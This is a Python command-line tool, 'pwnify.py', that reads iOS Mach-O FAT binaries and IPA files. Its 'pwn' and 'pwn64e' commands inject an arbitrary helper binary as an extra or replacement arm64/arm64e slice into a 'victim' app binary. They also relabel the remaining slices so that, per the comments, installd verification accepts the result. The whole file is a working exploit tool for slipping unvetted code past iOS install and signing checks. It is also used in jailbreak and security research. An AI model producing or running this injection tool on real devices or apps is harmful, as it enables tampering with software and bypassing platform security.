import struct
import sys
import os
import stat
import shutil
import zipfile

# Mach-O constants
FAT_MAGIC = 0xCAFEBABE
FAT_CIGAM = 0xBEBAFECA
MH_MAGIC_64 = 0xFEEDFACF
MH_CIGAM_64 = 0xCFFAEDFE
MH_MAGIC = 0xFEEDFACE
MH_CIGAM = 0xCEFAEDFE

CPU_TYPE_ARM64 = 0x0100000C
CPU_SUBTYPE_ARM64 = 0x00000001
CPU_SUBTYPE_ARM64E = 0x00000002
CPU_SUBTYPE_ARM64_ALL = 0x00000000

ALIGN_DEFAULT = 0xE  # 2^14 = 16384

def round_up(num, multiple):
    if multiple == 0:
        return num
    remainder = num % multiple
    if remainder == 0:
        return num
    return num + multiple - remainder

def read_fat_archs(data):
    """Read FAT binary and return list of arch entries."""
    magic = struct.unpack('>I', data[:4])[0]
    if magic not in (FAT_MAGIC, FAT_CIGAM):
        return None
    nfat = struct.unpack('>I', data[4:8])[0]
    archs = []
    for i in range(nfat):
        offset = 8 + i * 20
        cputype, cpusubtype, off, size, align = struct.unpack('>IIIII', data[offset:offset+20])
        archs.append({
            'cputype': cputype,
            'cpusubtype': cpusubtype,
            'offset': off,
            'size': size,
            'align': align,
            'fat_arch_offset': offset
        })
    return archs

def read_macho_header(data, offset=0):
    """Read Mach-O header at given offset."""
    if offset + 12 > len(data):
        return None
    magic = struct.unpack('<I', data[offset:offset+4])[0]
    if magic in (MH_MAGIC_64, MH_CIGAM_64, MH_MAGIC, MH_CIGAM):
        cputype = struct.unpack('<I', data[offset+4:offset+8])[0]
        cpusubtype = struct.unpack('<I', data[offset+8:offset+12])[0]
        return {'magic': magic, 'cputype': cputype, 'cpusubtype': cpusubtype}
    return None

def get_slices_from_data(data):
    """Get slices info from raw binary data."""
    fat_archs = read_fat_archs(data)
    if fat_archs:
        slices = []
        for idx, arch in enumerate(fat_archs):
            macho = read_macho_header(data, arch['offset'])
            slices.append({
                'cputype': arch['cputype'],
                'cpusubtype': arch['cpusubtype'],
                'offset': arch['offset'],
                'size': arch['size'],
                'align': arch['align'],
                'fat_arch_idx': idx,
                'macho_cpusubtype': macho['cpusubtype'] if macho else None,
                'is_fat': True
            })
        return slices
    else:
        macho = read_macho_header(data, 0)
        if macho:
            return [{
                'cputype': macho['cputype'],
                'cpusubtype': macho['cpusubtype'],
                'offset': 0,
                'size': len(data),
                'align': ALIGN_DEFAULT,
                'macho_cpusubtype': macho['cpusubtype'],
                'is_fat': False
            }]
    return []

def resolve_binary(filepath):
    """If filepath is an IPA, extract the main binary data. Otherwise read directly."""
    if filepath.endswith('.ipa') or filepath.endswith('.zip'):
        if not os.path.isfile(filepath):
            return None, f"File not found: {filepath}"
        try:
            with zipfile.ZipFile(filepath, 'r') as zf:
                # Find Payload/*.app/*.app binary (skip _CodeSignature etc)
                for name in zf.namelist():
                    if name.startswith('Payload/') and name.count('/') == 2 and '/' not in name[len('Payload/'):name.rfind('/')]:
                        # This is a file directly inside Payload/Some.app/
                        continue
                # Find the main executable
                # Strategy: look for Payload/X.app/X (same name as .app folder)
                app_names = set()
                for name in zf.namelist():
                    if name.startswith('Payload/') and '.app/' in name:
                        parts = name.split('/')
                        if len(parts) >= 3:
                            app_names.add(parts[1])
                
                for app_name in app_names:
                    binary_name = app_name.replace('.app', '')
                    binary_path = f"Payload/{app_name}/{binary_name}"
                    if binary_path in zf.namelist():
                        data = zf.read(binary_path)
                        return data, binary_path
                
                # Fallback: try to find any Mach-O binary
                for name in zf.namelist():
                    if name.startswith('Payload/') and '.app/' in name:
                        parts = name.split('/')
                        if len(parts) == 3 and '.' not in parts[2]:
                            data = zf.read(name)
                            macho = read_macho_header(data)
                            if macho:
                                return data, name
            return None, "No Mach-O binary found in IPA"
        except zipfile.BadZipFile:
            return None, "Not a valid ZIP/IPA file"
    else:
        if not os.path.isfile(filepath):
            return None, f"File not found: {filepath}"
        with open(filepath, 'rb') as f:
            return f.read(), filepath

def cmd_print(filepath):
    """Print architectures of a binary."""
    data, resolved = resolve_binary(filepath)
    if data is None:
        print(f"Error: {resolved}")
        sys.exit(1)
    
    slices = get_slices_from_data(data)
    if not slices:
        print(f"Error: Cannot parse {resolved}")
        sys.exit(1)
    
    print(f"File: {resolved} ({len(data)//1024}KB)")
    for i, s in enumerate(slices):
        sub_name = {0: 'ALL', 1: 'arm64', 2: 'arm64e', 0x80000002: 'arm64e(pac)'}.get(
            s['cpusubtype'], f"0x{s['cpusubtype']:X}")
        macho_sub = s.get('macho_cpusubtype')
        macho_str = {1: 'arm64', 2: 'arm64e', 0: 'ALL', 0x80000002: 'arm64e(pac)'}.get(
            macho_sub, f"0x{macho_sub:X}") if macho_sub is not None else '?'
        fat_info = f"fat[{s.get('fat_arch_idx', '-')}] " if s['is_fat'] else "thin  "
        print(f"  {i}. {fat_info}cputype=0x{s['cputype']:X} subtype=0x{s['cpusubtype']:X}({sub_name}) "
              f"macho={macho_str} size=0x{s['size']:X}")

def cmd_set_cpusubtype(filepath, subtype):
    """Modify cpusubtype of arm64 slice in binary."""
    if not os.path.isfile(filepath):
        print(f"Error: File not found: {filepath}")
        sys.exit(1)
    
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())
    
    fat_archs = read_fat_archs(data)
    if fat_archs:
        modified = False
        for arch in fat_archs:
            if arch['cputype'] == CPU_TYPE_ARM64 and arch['cpusubtype'] == CPU_SUBTYPE_ARM64_ALL:
                struct.pack_into('>I', data, arch['fat_arch_offset'] + 4, subtype)
                struct.pack_into('<I', data, arch['offset'] + 8, subtype)
                modified = True
                print(f"Updated FAT arm64 slice: cpusubtype 0x0 -> 0x{subtype:X}")
        if not modified:
            print("Warning: No arm64 slice with subtype 0 found in FAT binary")
    else:
        macho = read_macho_header(bytes(data), 0)
        if macho and macho['cputype'] == CPU_TYPE_ARM64 and macho['cpusubtype'] == CPU_SUBTYPE_ARM64_ALL:
            struct.pack_into('<I', data, 8, subtype)
            print(f"Updated thin arm64 binary: cpusubtype 0x0 -> 0x{subtype:X}")
        else:
            print(f"Warning: Not an arm64 binary with subtype 0 (cputype=0x{macho['cputype']:X}, subtype=0x{macho['cpusubtype']:X})")
    
    with open(filepath, 'wb') as f:
        f.write(data)
    os.chmod(filepath, os.stat(filepath).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

def cmd_pwn(victim_path, inject_path, prefer_arm64e=False):
    """Inject binary into victim FAT binary.
    
    For pwn (arm64): adds arm64 helper slice (keeps all victim slices)
    For pwn64e (arm64e): replaces existing arm64e slices with injected arm64e helper
    """
    # Read victim binary
    victim_data, victim_resolved = resolve_binary(victim_path)
    if victim_data is None:
        print(f"Error reading victim: {victim_resolved}")
        sys.exit(1)
    
    # Read inject binary
    inject_data, inject_resolved = resolve_binary(inject_path)
    if inject_data is None:
        print(f"Error reading inject: {inject_resolved}")
        sys.exit(1)
    
    align = 1 << ALIGN_DEFAULT
    
    victim_slices = get_slices_from_data(victim_data)
    if not victim_slices:
        print("Error: Cannot parse victim binary")
        sys.exit(1)
    
    inject_slices = get_slices_from_data(inject_data)
    if not inject_slices:
        print("Error: Cannot parse inject binary")
        sys.exit(1)
    
    subtype_to_use = CPU_SUBTYPE_ARM64E if prefer_arm64e else CPU_SUBTYPE_ARM64
    
    # Find matching inject slice
    inject_slice = None
    for s in inject_slices:
        effective = s.get('macho_cpusubtype', s['cpusubtype'])
        if s['cputype'] == CPU_TYPE_ARM64 and (effective & 0xFFFFFF) == subtype_to_use:
            inject_slice = s
            break
    
    if not inject_slice:
        want = 'arm64e' if prefer_arm64e else 'arm64'
        print(f"Error: No {want} slice found in inject binary")
        sys.exit(1)
    
    if prefer_arm64e:
        # pwn64e: keep arm64 slices (for installd verification), REPLACE arm64e slices
        output_slices = []
        for s in victim_slices:
            macho_sub = s.get('macho_cpusubtype', s['cpusubtype'])
            if s['cputype'] == CPU_TYPE_ARM64 and (macho_sub & 0xFFFFFF) >= 2:
                # This is an arm64e slice — SKIP it (will be replaced)
                print(f"  Replacing victim arm64e slice (subtype=0x{macho_sub:X}, size={s['size']})")
                continue
            # Keep this slice (arm64 or non-arm64e)
            new_subtype = s['cpusubtype']
            if s['cputype'] == CPU_TYPE_ARM64:
                new_subtype = CPU_SUBTYPE_ARM64E  # Change FAT subtype for installd
            output_slices.append({
                'cputype': s['cputype'],
                'cpusubtype': new_subtype,
                'size': s['size'],
                'align': ALIGN_DEFAULT,
                'orig_offset': s['offset'],
                'orig_data': victim_data,
            })
        # Add the injected arm64e helper
        output_slices.append({
            'cputype': CPU_TYPE_ARM64,
            'cpusubtype': inject_slice['cpusubtype'],
            'size': inject_slice['size'],
            'align': ALIGN_DEFAULT,
            'orig_offset': inject_slice['offset'],
            'orig_data': inject_data,
        })
    else:
        # pwn: keep all victim slices (arm64→arm64e in FAT), add injected arm64
        output_slices = []
        for s in victim_slices:
            new_subtype = s['cpusubtype']
            if s['cputype'] == CPU_TYPE_ARM64:
                new_subtype = CPU_SUBTYPE_ARM64E
            output_slices.append({
                'cputype': s['cputype'],
                'cpusubtype': new_subtype,
                'size': s['size'],
                'align': ALIGN_DEFAULT,
                'orig_offset': s['offset'],
                'orig_data': victim_data,
            })
        output_slices.append({
            'cputype': CPU_TYPE_ARM64,
            'cpusubtype': inject_slice['cpusubtype'],
            'size': inject_slice['size'],
            'align': ALIGN_DEFAULT,
            'orig_offset': inject_slice['offset'],
            'orig_data': inject_data,
        })
    
    # Build FAT
    total_slices = len(output_slices)
    fat_data = bytearray()
    fat_data += struct.pack('>II', FAT_MAGIC, total_slices)
    
    cur_offset = align
    for entry in output_slices:
        entry['offset'] = cur_offset
        fat_data += struct.pack('>IIIII',
            entry['cputype'], entry['cpusubtype'],
            entry['offset'], entry['size'], entry['align'])
        cur_offset += round_up(entry['size'], align)
    
    # Assemble output
    output = bytearray(cur_offset)
    output[:len(fat_data)] = fat_data
    
    for entry in output_slices:
        start = entry['orig_offset']
        end = start + entry['size']
        output[entry['offset']:entry['offset']+entry['size']] = entry['orig_data'][start:end]
    
    # Write output
    if victim_path.endswith('.ipa') or victim_path.endswith('.zip'):
        print("Error: Cannot modify IPA in-place. Extract the binary first.")
        sys.exit(1)
    
    tmp_path = victim_path + '.tmp'
    with open(tmp_path, 'wb') as f:
        f.write(output)
    os.chmod(tmp_path, os.stat(tmp_path).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    shutil.move(tmp_path, victim_path)
    
    mode = 'arm64e' if prefer_arm64e else 'arm64'
    action = 'replaced arm64e slice' if prefer_arm64e else 'injected arm64 slice'
    print(f"Successfully {action} ({inject_slice['size']} bytes) in {victim_path}")
    print(f"Output: {total_slices} architecture slices")

def main():
    if len(sys.argv) < 3:
        print("pwnify.py - Pure Python Mach-O FAT binary manipulation")
        print()
        print("Usage:")
        print("  pwnify.py print <binary|ipa>")
        print("  pwnify.py set-cpusubtype <binary> <subtype>")
        print("  pwnify.py pwn <victim_binary> <inject_binary>")
        print("  pwnify.py pwn64e <victim_binary> <inject_binary>")
        sys.exit(1)
    
    cmd = sys.argv[1]
    
    if cmd == 'print':
        cmd_print(sys.argv[2])
    elif cmd == 'set-cpusubtype':
        if len(sys.argv) < 4:
            print("Error: subtype required")
            sys.exit(1)
        cmd_set_cpusubtype(sys.argv[2], int(sys.argv[3]))
    elif cmd == 'pwn':
        if len(sys.argv) < 4:
            print("Error: inject binary required")
            sys.exit(1)
        cmd_pwn(sys.argv[2], sys.argv[3], prefer_arm64e=False)
    elif cmd == 'pwn64e':
        if len(sys.argv) < 4:
            print("Error: inject binary required")
            sys.exit(1)
        cmd_pwn(sys.argv[2], sys.argv[3], prefer_arm64e=True)
    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)

if __name__ == '__main__':
    main()
